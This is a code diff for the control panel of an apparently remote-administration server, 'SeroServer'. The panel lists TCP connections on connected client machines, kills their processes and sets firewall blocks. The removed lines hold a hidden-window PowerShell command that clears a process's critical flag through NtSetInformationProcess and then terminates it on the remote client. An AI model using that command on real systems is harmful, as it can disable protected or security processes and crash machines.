@@ -1,6 +1,9 @@
 using System.Collections.ObjectModel;
+using System.ComponentModel;
+using System.Runtime.CompilerServices;
 using System.Windows;
-using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
 using DevExpress.Xpf.Core;
 using Newtonsoft.Json;
 using SeroServer.Net;
@@ -8,11 +11,34 @@ using SeroServer.Protocol;
 
 namespace SeroServer.UI;
 
+public class TcpEntryVM : INotifyPropertyChanged
+{
+    public event PropertyChangedEventHandler? PropertyChanged;
+    private void N([CallerMemberName] string? p = null) => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(p));
+
+    private int    _pid;
+    private string _processName = "";
+    private string _exePath     = "";
+    private string _localAddr   = "";
+    private string _remoteAddr  = "";
+    private string _state       = "";
+    private BitmapSource? _icon;
+
+    public int    Pid         { get => _pid;         set { if (_pid != value)         { _pid = value;         N(); } } }
+    public string ProcessName { get => _processName; set { if (_processName != value) { _processName = value; N(); } } }
+    public string ExePath     { get => _exePath;     set { if (_exePath != value)     { _exePath = value;     N(); } } }
+    public string LocalAddr   { get => _localAddr;   set { if (_localAddr != value)   { _localAddr = value;   N(); } } }
+    public string RemoteAddr  { get => _remoteAddr;  set { if (_remoteAddr != value)  { _remoteAddr = value;  N(); } } }
+    public string State       { get => _state;       set { if (_state != value)       { _state = value;       N(); } } }
+    public BitmapSource? IconImage { get => _icon; set { if (_icon != value) { _icon = value; N(); } } }
+}
+
 public partial class TcpManagerWindow : ThemedWindow
 {
     private readonly TlsServer _server;
     private readonly string    _clientId;
     private readonly ObservableCollection<TcpEntryVM> _entries = [];
+    private bool _disconnected = false;
 
     public TcpManagerWindow(TlsServer server, string clientId, string clientLabel)
     {
@@ -23,8 +49,9 @@ public partial class TcpManagerWindow : ThemedWindow
         TxtTitle.Text  = clientLabel;
         GridTcp.ItemsSource = _entries;
 
-        _server.RegisterHandler(clientId, PacketType.TcpListResult,       OnTcpList);
+        _server.RegisterHandler(clientId, PacketType.TcpListResult,          OnTcpList);
         _server.RegisterHandler(clientId, PacketType.TcpFirewallRulesResult, OnFirewallResult);
+        _server.ClientDisconnected += OnClientDisconnected;
 
         Lang.LanguageChanged += ApplyLanguage;
         ApplyLanguage();
@@ -32,6 +59,7 @@ public partial class TcpManagerWindow : ThemedWindow
         {
             _server.UnregisterHandler(clientId, PacketType.TcpListResult);
             _server.UnregisterHandler(clientId, PacketType.TcpFirewallRulesResult);
+            _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
         };
         Loaded += async (_, _) => { await Task.Delay(Random.Shared.Next(0, 250)); await Refresh(); };
@@ -55,6 +83,7 @@ public partial class TcpManagerWindow : ThemedWindow
 
     private async Task Refresh()
     {
+        if (_disconnected) return;
         TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
         await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpGetList });
     }
@@ -65,17 +94,79 @@ public partial class TcpManagerWindow : ThemedWindow
         {
             var data = JsonConvert.DeserializeObject<TcpListResultData>(pkt.Data);
             if (data == null) return;
-            Dispatcher.BeginInvoke(() =>
+
+            _ = Task.Run(() =>
             {
-                _entries.Clear();
+                // Phase 1: incremental update of entries on UI thread
+                Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
+                {
+                    var selectedKey = GetSelectedKey();
+                    var byKey = _entries.ToDictionary(e => MakeKey(e));
+
+                    var seenKeys = new HashSet<string>();
+                    foreach (var e in data.Entries)
+                    {
+                        var key = MakeKey(e.LocalAddr, e.RemoteAddr, e.Pid);
+                        seenKeys.Add(key);
+                        if (byKey.TryGetValue(key, out var existing))
+                        {
+                            existing.ProcessName = e.ProcessName;
+                            existing.ExePath     = e.ExePath;
+                            existing.State       = e.State;
+                        }
+                        else
+                        {
+                            _entries.Add(new TcpEntryVM
+                            {
+                                Pid = e.Pid, ProcessName = e.ProcessName, ExePath = e.ExePath,
+                                LocalAddr = e.LocalAddr, RemoteAddr = e.RemoteAddr, State = e.State
+                            });
+                        }
+                    }
+                    for (int i = _entries.Count - 1; i >= 0; i--)
+                        if (!seenKeys.Contains(MakeKey(_entries[i])))
+                            _entries.RemoveAt(i);
+
+                    TxtCount.Text  = $"({_entries.Count})";
+                    TxtStatus.Text = string.Format(Lang.Get("TCP_UPDATED"), _entries.Count, DateTime.Now.ToString("HH:mm:ss"));
+
+                    if (selectedKey != null)
+                    {
+                        var restore = _entries.FirstOrDefault(e => MakeKey(e) == selectedKey);
+                        if (restore != null) GridTcp.SelectedItem = restore;
+                    }
+                });
+
+                // Phase 2: resolve icons by extension in background, push batch to UI
+                var iconBatch = new List<(string key, BitmapSource icon)>();
                 foreach (var e in data.Entries)
-                    _entries.Add(new TcpEntryVM(e.Pid, e.ProcessName, e.LocalAddr, e.RemoteAddr, e.State));
-                TxtCount.Text = $"({_entries.Count})";
-                TxtStatus.Text = string.Format(Lang.Get("TCP_UPDATED"), _entries.Count, DateTime.Now.ToString("HH:mm:ss"));
+                {
+                    var ext = string.IsNullOrEmpty(e.ExePath)
+                        ? ".exe"
+                        : (System.IO.Path.GetExtension(e.ExePath) is { Length: > 0 } ex ? ex : ".exe");
+                    var icon = ShellIcon.Get(ext, false);
+                    if (icon != null)
+                        iconBatch.Add((MakeKey(e.LocalAddr, e.RemoteAddr, e.Pid), icon));
+                }
+                if (iconBatch.Count > 0)
+                {
+                    Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
+                    {
+                        var byKey = _entries.ToDictionary(e => MakeKey(e));
+                        foreach (var (key, icon) in iconBatch)
+                            if (byKey.TryGetValue(key, out var vm))
+                                vm.IconImage = icon;
+                    });
+                }
             });
         }
         catch { }
     }
+
+    private static string MakeKey(string local, string remote, int pid) => $"{local}|{remote}|{pid}";
+    private static string MakeKey(TcpEntryVM vm) => $"{vm.LocalAddr}|{vm.RemoteAddr}|{vm.Pid}";
+    private static string MakeKey(TcpEntry e)    => $"{e.LocalAddr}|{e.RemoteAddr}|{e.Pid}";
+    private string? GetSelectedKey() => GridTcp.SelectedItem is TcpEntryVM vm ? MakeKey(vm) : null;
 
     private void OnFirewallResult(Packet pkt)
     {
@@ -91,6 +182,18 @@ public partial class TcpManagerWindow : ThemedWindow
             });
         }
         catch { }
+    }
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _disconnected = true;
+            TxtStatus.Text    = Lang.Get("PM_DISCONNECTED");
+            TxtStatus.Foreground = new SolidColorBrush(Color.FromRgb(0xF5, 0x9E, 0x0B));
+            GridTcp.Opacity   = 0.55;
+        });
     }
 
     private async void Refresh_Click(object s, RoutedEventArgs e) { try { await Refresh(); } catch { } }
@@ -122,6 +225,7 @@ public partial class TcpManagerWindow : ThemedWindow
     {
         try
         {
+            if (_disconnected) return;
             var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().Where(r => r.Pid > 0).ToList();
             if (sel.Count == 0) return;
             string confirmMsg = sel.Count == 1
@@ -129,22 +233,11 @@ public partial class TcpManagerWindow : ThemedWindow
                 : string.Format(Lang.Get("PM_KILL_N"), sel.Count);
             if (MessageBox.Show(confirmMsg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
             foreach (var row in sel)
-            {
-                var cmd = $"powershell -NoP -NonI -W H -Command \"" +
-                          $"Add-Type -TypeDefinition @'`n" +
-                          $"using System.Runtime.InteropServices;`n" +
-                          $"public class PK {{`n" +
-                          $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
-                          $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
-                          $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
-                          $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
-                          $"}}`n" +
-                          $"'@ -ErrorAction SilentlyContinue;" +
-                          $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
-                          $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
-                          $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";
-                await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
-            }
+                await _server.SendToClient(_clientId, new Packet
+                {
+                    Type = PacketType.ProcKill,
+                    Data = JsonConvert.SerializeObject(new ProcKillData { Pid = row.Pid })
+                });
             TxtStatus.Text = sel.Count == 1
                 ? string.Format(Lang.Get("TCP_KILL_SENT"), sel[0].Pid, sel[0].ProcessName)
                 : string.Format(Lang.Get("TCP_KILL_SENT_N"), sel.Count);
@@ -160,6 +253,7 @@ public partial class TcpManagerWindow : ThemedWindow
     {
         try
         {
+            if (_disconnected) return;
             var selected = GridTcp.SelectedItem as TcpEntryVM;
             string? defIp = selected?.RemoteAddr?.Split(':').FirstOrDefault();
             var ip = SimpleInput("Block remote IP in firewall (inbound + outbound):", defIp ?? "");
@@ -180,6 +274,7 @@ public partial class TcpManagerWindow : ThemedWindow
     {
         try
         {
+            if (_disconnected) return;
             var selected = GridTcp.SelectedItem as TcpEntryVM;
             var name = SimpleInput("Block process (full path or name):", selected?.ProcessName ?? "");
             if (string.IsNullOrWhiteSpace(name)) return;
@@ -199,6 +294,7 @@ public partial class TcpManagerWindow : ThemedWindow
     {
         try
         {
+            if (_disconnected) return;
             var selected = GridTcp.SelectedItem as TcpEntryVM;
             string? defPort = null;
             if (selected?.LocalAddr?.Contains(':') == true &&
@@ -237,15 +333,8 @@ public partial class TcpManagerWindow : ThemedWindow
             try { System.Windows.Clipboard.SetText(vm.RemoteAddr); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.RemoteAddr); } catch { }
     }
 
-    private void Close_Click(object s, RoutedEventArgs e) => Close();
-
     private void GridTcp_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
     {
         if (GridTcp.SelectedItems.Count == 0) e.Handled = true;
     }
-}
-
-public record TcpEntryVM(int Pid, string ProcessName, string LocalAddr, string RemoteAddr, string State)
-{
-    public static System.Windows.Media.ImageSource? ExeIcon { get; } = ShellIcon.Get(".exe", false);
 }
